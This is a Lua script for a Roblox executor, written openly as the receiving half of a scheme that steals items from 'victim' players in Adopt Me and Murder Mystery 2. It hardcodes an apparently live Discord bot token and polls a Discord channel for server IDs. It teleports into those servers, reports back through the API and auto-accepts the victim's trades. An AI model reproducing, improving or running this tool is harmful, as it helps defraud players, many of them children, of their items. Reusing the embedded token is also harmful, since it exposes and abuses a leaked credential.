-- // 1. CONFIGURATION
local token = "MTQ4MjI0ODQxMTIxMzQ2MzY5NA.GMzmbh.3e6hu-wO3nO1Qi4ISuBEGc4imrw8hT73k8v2AE" 
local channelId = "1482246461889576977"

-- // 2. SERVICES & INITIALIZATION
if not game:IsLoaded() then game.Loaded:Wait() end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:kick("Add your token or channelId to use")
end

local HttpServ = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local bb = game:GetService("VirtualUser")

-- Anti-AFK
game:GetService("Players").LocalPlayer.Idled:connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

-- File System
if not isfile("user.txt") then writefile("user.txt", "victim username") end
if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end

local victimUser = readfile("user.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

-- Monitor Victim Leaving
game.Players.PlayerRemoving:Connect(function(removedPlayer)
    if removedPlayer.Name == victimUser then didVictimLeave = true end
end)

-- // 3. DISCORD BOT-TOKEN AUTO-JOINER
local function sendDebug(msg) -- Send logs back to the channel
    request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages",
        Method = "POST",
        Headers = {['Authorization'] = "Bot " .. token, ["Content-Type"] = "application/json"},
        Body = HttpServ:JSONEncode({["content"] = "DEBUG: " .. msg})
    })
end

local function unifiedAutoJoin()
    if didVictimLeave or timer >= 10 then
        local response = request({
            Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
            Method = "GET",
            Headers = {
                ['Authorization'] = "Bot " .. token, -- Bot Token Auth
                ["Content-Type"] = "application/json"
            }
        })

        if response.StatusCode == 200 then
            local messages = HttpServ:JSONDecode(response.Body)
            for _, message in ipairs(messages) do
                if message.embeds and message.embeds[1] and message.embeds[1].title and message.embeds[1].title:find("Join to get") then
                    local placeId, jobId = string.match(message.content or "", 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                    if placeId and jobId and not table.find(joinedIds, tostring(message.id)) then
                        saveJoinedId(tostring(message.id))
                        writefile("user.txt", message.embeds[1].fields[1].value)
                        sendDebug("Joining Server: " .. placeId)
                        TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
                        return
                    end
                end
            end
        else
            warn("Discord API Error: " .. (response.StatusCode or "Unknown"))
        end
    end
end

-- // 4. GAME LOGIC (ADOPT ME & MM2)
if game.PlaceId == 920587237 then -- Adopt Me
    local RouterClient = require(game.ReplicatedStorage.Fsys).load("RouterClient")
    local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
    
    RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
        RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(sender, (sender.Name == victimUser))
    end)

    task.spawn(function()
        while task.wait(0.2) do
            if game.Players.LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
                for uid, _ in pairs(inventory.food or {}) do
                    RouterClient.get("TradeAPI/AddItemToOffer"):FireServer(uid)
                    task.wait(0.1)
                end
                RouterClient.get("TradeAPI/AcceptNegotiation"):FireServer()
                RouterClient.get("TradeAPI/ConfirmTrade"):FireServer()
                timer = 0
            else
                timer = timer + 1
            end
        end
    end)
elseif game.PlaceId == 142823291 then -- MM2
    task.spawn(function()
        while task.wait(0.2) do
            if game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer() == "StartTrade" then
                game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(285646582)
                timer = 0
            else
                timer = timer + 1
            end
        end
    end)
end

-- // 5. MAIN LOOP
while task.wait(5) do
    unifiedAutoJoin()
end
